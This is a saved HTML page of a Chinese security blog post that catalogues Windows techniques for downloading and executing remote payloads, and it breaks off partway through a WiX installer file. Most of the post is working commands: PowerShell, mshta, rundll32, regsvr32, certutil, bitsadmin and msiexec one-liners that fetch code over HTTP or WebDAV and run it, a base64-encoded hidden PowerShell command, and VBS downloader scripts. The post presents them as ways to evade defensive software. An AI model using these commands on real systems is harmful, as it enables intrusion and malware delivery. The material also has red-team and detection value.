@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Download Payload AND Exec - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="0x00 起因 一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。 攻击脚本参考: HTA-SCT-DLL-WMI 后渗透阶段的攻防对抗 Atomic-Red-Team 进入正题: 1 2 3 4 5 6 任意代码执行 – 例如" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/download-remote-payload-and-exec/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Download Payload AND Exec" />
+<meta property="og:description" content="0x00 起因 一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。 攻击脚本参考: HTA-SCT-DLL-WMI 后渗透阶段的攻防对抗 Atomic-Red-Team 进入正题: 1 2 3 4 5 6 任意代码执行 – 例如" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/download-remote-payload-and-exec/" />
+<meta property="article:published_time" content="2017-11-29T19:34:24&#43;00:00"/>
+<meta property="article:modified_time" content="2017-11-29T19:34:24&#43;00:00"/>
+
+<meta itemprop="name" content="Download Payload AND Exec">
+<meta itemprop="description" content="0x00 起因 一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。 攻击脚本参考: HTA-SCT-DLL-WMI 后渗透阶段的攻防对抗 Atomic-Red-Team 进入正题: 1 2 3 4 5 6 任意代码执行 – 例如">
+
+
+<meta itemprop="datePublished" content="2017-11-29T19:34:24&#43;00:00" />
+<meta itemprop="dateModified" content="2017-11-29T19:34:24&#43;00:00" />
+<meta itemprop="wordCount" content="3223">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Download Payload AND Exec"/>
+<meta name="twitter:description" content="0x00 起因 一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。 攻击脚本参考: HTA-SCT-DLL-WMI 后渗透阶段的攻防对抗 Atomic-Red-Team 进入正题: 1 2 3 4 5 6 任意代码执行 – 例如"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Download Payload AND Exec</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-起因">0x00 起因</a></li>
+<li><a href="#0x01-powershell">0x01 Powershell</a></li>
+<li><a href="#0x02-cmd">0x02 Cmd</a></li>
+<li><a href="#0x03-cscript-wscript">0x03 Cscript/Wscript</a></li>
+<li><a href="#0x04-mshta">0x04 Mshta</a></li>
+<li><a href="#0x05-rundll32">0x05 Rundll32</a></li>
+<li><a href="#0x06-regasm-regsvc">0x06 Regasm/Regsvc</a></li>
+<li><a href="#0x07-regsvr32">0x07 Regsvr32</a></li>
+<li><a href="#0x08-msbuild">0x08 Msbuild</a></li>
+<li><a href="#0x09-bitsadmin">0x09 bitsadmin</a></li>
+<li><a href="#0x10-组合命令">0x10 组合命令</a></li>
+<li><a href="#0x11-vbs">0x11 vbs</a></li>
+<li><a href="#0x12-odbcconf">0x12  Odbcconf</a></li>
+<li><a href="#0x13-msiexec">0x13 msiexec</a></li>
+<li><a href="#0x14-linux-部分较特殊">0x14 Linux.部分较特殊</a></li>
+<li><a href="#0x15-相关链接">0x15 相关链接</a></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="0x00-起因">0x00 起因</h1>
+
+<p>一群大黑客,随便上传东西到别人的服务器，这样是不道德滴。<br />
+攻击脚本参考:<br />
+<a href="https://04z.net/2017/10/02/HTA-SCT-DLL-WMI/">HTA-SCT-DLL-WMI</a><br />
+<a href="https://04z.net/2017/06/23/Bypass-Privilege/">后渗透阶段的攻防对抗</a><br />
+<a href="https://github.com/redcanaryco/atomic-red-team">Atomic-Red-Team</a></p>
+
+<p>进入正题:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">任意代码执行 – 例如最新的CVE-2017-11882字符长度限制
+从远程服务器上下载payload – 控制端不交互
+可以通过代理
+使用标准微软二进制文件 – 多个系统执行
+EDR(端点检测与响应)友好
+在内存里工作 – 因为当你的payload写入磁盘时,可能被防护软件查杀</pre></td></tr></table>
+</div>
+</div>
+<p>首先要清楚的是,不是所有命令都能满足上述要求.尤其是 <strong>不写入payload到磁盘</strong>,因为大部分情况下下载的文件会保存到本地缓存中.</p>
+
+<p>当从远程服务器下载<code>payload</code>时,有3种情况:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">该命令接受一个HTTP URL
+该命令接受一个UNC路径(指向WebDAV服务器)
+该命令能执行一小段脚本,通过脚本来下载payload</pre></td></tr></table>
+</div>
+</div>
+<p><code>windows7,10</code>,HTTP下载的文件保存于IE本地缓存:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\
+C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Windows\INetCache\IE\&lt;subdir&gt;</pre></td></tr></table>
+</div>
+</div>
+<p>另外,UAC从WebDAV下载的文件将保存在WebDAV客户端本地缓存:</p>
+
+<p><code>C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV</code></p>
+
+<p>使用UNC需要确保WebClient服务开启.<br />
+启动命令 <code>pushd \\webdavserver &amp; popd</code></p>
+
+<h1 id="0x01-powershell">0x01 Powershell</h1>
+
+<p>一. HTTP</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-c</span> <span class="s2">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;&#34;</span></code></pre></td></tr></table>
+</div>
+</div>
+<blockquote>
+<p>进行网络通信的进程:powershell.exe<br />
+位置:可以选择不写入,<code>'C:/test/update/ssss2.exe'</code>为可选项</p>
+</blockquote>
+
+<p>二. Webdav<br />
+<code>powershell -exec bypass -f \\webdavserver\folder\payload.ps1</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:<code>svchost.exe</code><br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<h1 id="0x02-cmd">0x02 Cmd</h1>
+
+<p><a href="https://github.com/Arno0x/PowerShellScripts">https://github.com/Arno0x/PowerShellScripts</a></p>
+
+<p><code>cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt</code><br />
+<code>batchfile.txt</code>是位于WebDAV服务器上的批处理payload</p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<h1 id="0x03-cscript-wscript">0x03 Cscript/Wscript</h1>
+
+<p><code>cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<h1 id="0x04-mshta">0x04 Mshta</h1>
+
+<p>一. Mshta和Cscript/Wscript属于同一家族,但是它增加了执行脚本的能力.<br />
+<code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:mshta.exe<br />
+位置:IE本地缓存</p>
+</blockquote>
+
+<p>二. 更简单的方式是,mshta接收一个URL作为参数来执行HTA文件<br />
+<code>mshta https://3gstudent.github.io/test/calc.hta</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:mshta.exe<br />
+位置:IE本地缓存<br />
+弹框提示此计算机上的安全设置禁止访问其它域的数据源<br />
+解决方法：<br />
+IE浏览器-Internet选项-安全<br />
+自定义级别，找到通过域访问数据源，选择启用<br />
+选择可信站点，添加博客地址：<a href="https://3gstudent.github.io">https://3gstudent.github.io</a><br />
+限制长度可以使用短地址,部分短地址网站不支持,最终实现的最短字符为25</p>
+</blockquote>
+
+<p>三. 下面的命令也能工作,并有隐藏下载的文件的优点<br />
+<code>mshta \\webdavserver/payload.hta</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<h1 id="0x05-rundll32">0x05 Rundll32</h1>
+
+<p>一. 指向标准DLL的UNC路径<br />
+<code>rundll32 \\webdavserver\folder\payload.dll,entrypoint</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<p>二. rundll32也可以用于调用jscript脚本<br />
+<code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);window.close();</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:rundll32.exe<br />
+位置:IE本地缓存</p>
+</blockquote>
+
+<h1 id="0x06-regasm-regsvc">0x06 Regasm/Regsvc</h1>
+
+<p>Regasm和Regsvc是@subTee发现的绕过应用程序白名单的技术之一.你需要创建一个特定的DLL文件(可用.Net/C#写),然后通过WebDAV调用</p>
+
+<p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<h1 id="0x07-regsvr32">0x07 Regsvr32</h1>
+
+<p>一. HTTP<br />
+<code>regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:regsvr32.exe<br />
+位置:IE本地缓存</p>
+</blockquote>
+
+<p>二. Webdav<br />
+<code>regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll</code></p>
+
+<blockquote>
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存</p>
+</blockquote>
+
+<p>原理：</p>
+
+<p>regsve32-&gt;JScript-&gt;powershell-&gt;download&amp;exec</p>
+
+<p>JScript调用powershell实现下载执行的代码为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">new</span> <span class="n">ActiveXObject</span><span class="p">(</span><span class="s2">&#34;WScript.Shell&#34;</span><span class="p">).</span><span class="n">Run</span><span class="p">(</span><span class="s2">&#34;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39;&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="n">true</span><span class="p">);</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>参照sct文件格式：</p>
+
+<p><a href="https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct">https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct</a></p>
+
+<p>添加功能，生成downloadexec.sct</p>
+
+<p>通常，vbs脚本实现的下载执行代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+Dim http,ado
+Set http = CreateObject(&#34;Msxml2.XMLHTTP&#34;)
+http.open &#34;GET&#34;,&#34;http://192.168.81.192/putty.exe&#34;,False
+http.send
+Set ado = createobject(&#34;Adodb.Stream&#34;)
+ado.Type = adTypeBinary
+ado.Open
+ado.Write http.responseBody
+ado.SaveToFile &#34;c:\download\a.exe&#34;
+ado.Close</code></pre></td></tr></table>
+</div>
+</div>
+<p>但该脚本不支持https下载，可以换用Msxml2.ServerXMLHTTP.6.0</p>
+
+<p>代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+Dim http,ado
+Set http = CreateObject(&#34;Msxml2.ServerXMLHTTP.6.0&#34;)
+http.SetOption 2, 13056
+http.open &#34;GET&#34;,&#34;https://github.com/3gstudent/test/raw/master/putty.exe&#34;,False
+http.send
+Set ado = createobject(&#34;Adodb.Stream&#34;)
+ado.Type = adTypeBinary
+ado.Open
+ado.Write http.responseBody
+ado.SaveToFile &#34;c:\download\a.exe&#34;
+ado.Close</code></pre></td></tr></table>
+</div>
+</div>
+<p>注：该思路来自@mosin @索马里海贼</p>
+
+<p>也可以通过WinHttp.WinHttpRequest.5.1实现，代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+Dim http,ado
+Set http = CreateObject(&#34;WinHttp.WinHttpRequest.5.1&#34;)
+http.open &#34;GET&#34;,&#34;https://github.com/3gstudent/test/raw/master/putty.exe&#34;,False
+http.send
+Set ado = createobject(&#34;Adodb.Stream&#34;)
+ado.Type = adTypeBinary
+ado.Open
+ado.Write http.responseBody
+ado.SaveToFile &#34;c:\download\a.exe&#34;
+ado.Close</pre></td></tr></table>
+</div>
+</div>
+<p>注：该思路来自@ogre</p>
+
+<p>vbs脚本实现的执行代码</p>
+
+<p><code>WScript.CreateObject(&quot;WScript.Shell&quot;).Run &quot;c:\download\a.exe&quot;,0,true</code><br />
+依旧是以sct文件作为模板，添加功能，生成downloadexec2.sct</p>
+
+<p>实现功能：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">regsvr32</span> <span class="p">/</span><span class="n">u</span> <span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">i</span><span class="err">:</span><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">3gstudent</span><span class="p">/</span><span class="n">test</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">downloadexec2</span><span class="p">.</span><span class="n">sct</span> <span class="n">scrobj</span><span class="p">.</span><span class="n">dll</span></code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x08-msbuild">0x08 Msbuild</h1>
+
+<p>注意,它将需要使用在shell种使用ENABLEDELAYEDEXPANSION(/ V选项)<br />
+<code>cmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot;</code></p>
+
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端本地缓存<br />
+也可以使用其它方式下载文件,然后用msbuild.exe来执行.</p>
+
+<h1 id="0x09-bitsadmin">0x09 bitsadmin</h1>
+
+<p><code>bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe &amp;&amp; c:\download\a.exe</code><br />
+注意,不支持https、ftp协议.使用python简易服务器会报错.使用bitsadmin的下载速度较慢</p>
+
+<h1 id="0x10-组合命令">0x10 组合命令</h1>
+
+<p><code>certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</code></p>
+
+<p>组合多条命令到一起,使用InstallUtil.exe执行DLL的payload</p>
+
+<p><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</code></p>
+
+<p>当然了，你也可以直接传递一个可执行文件：</p>
+
+<p><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</code></p>
+
+<h1 id="0x11-vbs">0x11 vbs</h1>
+
+<p>vbs downloader,使用msxml2.xmlhttp和adodb.stream对象</p>
+
+<p>1.可以直接上传vbs脚本.执行即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">Set Post = CreateObject(&#34;Msxml2.XMLHTTP&#34;)
+Set Shell = CreateObject(&#34;Wscript.Shell&#34;)
+Post.Open &#34;GET&#34;,&#34;http://192.168.174.145/ssss2.exe&#34;,0
+Post.Send()
+Set aGet = CreateObject(&#34;ADODB.Stream&#34;)
+aGet.Mode = 3
+aGet.Type = 1
+aGet.Open()
+aGet.Write(Post.responseBody)
+aGet.SaveToFile &#34;C:/test/update/ssss2.exe&#34;,2</code></pre></td></tr></table>
+</div>
+</div>
+<p>2.没有交互shell ,使用echo写入download.vbs：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-vbs" data-lang="vbs">echo Set Post = CreateObject(&#34;Msxml2.XMLHTTP&#34;) &gt;&gt;download.vbs
+echo Set Shell = CreateObject(&#34;Wscript.Shell&#34;) &gt;&gt;download.vbs
+echo Post.Open &#34;GET&#34;,&#34;http://192.168.174.145/ssss2.exe&#34;,0 &gt;&gt;download.vbs
+echo Post.Send() &gt;&gt;download.vbs
+echo Set aGet = CreateObject(&#34;ADODB.Stream&#34;) &gt;&gt;download.vbs
+echo aGet.Mode = 3 &gt;&gt;download.vbs
+echo aGet.Type = 1 &gt;&gt;download.vbs
+echo aGet.Open() &gt;&gt;download.vbs
+echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs
+echo aGet.SaveToFile &#34;C:/test/update/ssss2.exe&#34;,2 &gt;&gt;download.vbs</code></pre></td></tr></table>
+</div>
+</div>
+<p>按顺序依次执行后会生成download.vbs，然后执行download.vbs即可实现下载ssss2.exe</p>
+
+<hr />
+
+<p>分割线[更新]</p>
+
+<h1 id="0x12-odbcconf">0x12  Odbcconf</h1>
+
+<p>Odbcconf跟regsvr32有些类似，它同样是@subTee发明的。它能够执行包含特殊功能的DLL，需要注意的是，这种DLL文件不需要使用.dll后缀，而且可以通过UNC/WebDAV下载</p>
+
+<p><code>odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}</code></p>
+
+<p>进行网络通信的进程:svchost.exe<br />
+位置:WebDAV客户端或者web本地缓存</p>
+
+<h1 id="0x13-msiexec">0x13 msiexec</h1>
+
+<p><code>msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi</code></p>
+
+<p><code>《渗透测试中的msiexec》《渗透技巧——从Admin权限切换到System权限》</code>有过介绍，细节不再赘述</p>
+
+<p>首先将powershell实现下载执行的代码作base64编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$fileContent</span> <span class="p">=</span> <span class="s2">&#34;(new-object System.Net.WebClient).DownloadFile(&#39;https://github.com/3gstudent/test/raw/master/putty.exe&#39;,&#39;c:\download\a.exe&#39;);start-process &#39;c:\download\a.exe&#39;&#34;</span>
+<span class="nv">$bytes</span>  <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$fileContent</span><span class="p">);</span>
+<span class="nv">$encoded</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">);</span>
+<span class="nv">$encoded</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA</span><span class="p">==</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>完整powershell命令为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span> <span class="n">-enc</span> <span class="n">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA</span><span class="p">==</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>完整wix文件为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/wix/2006/wi&#34;</span><span class="nt">&gt;</span>
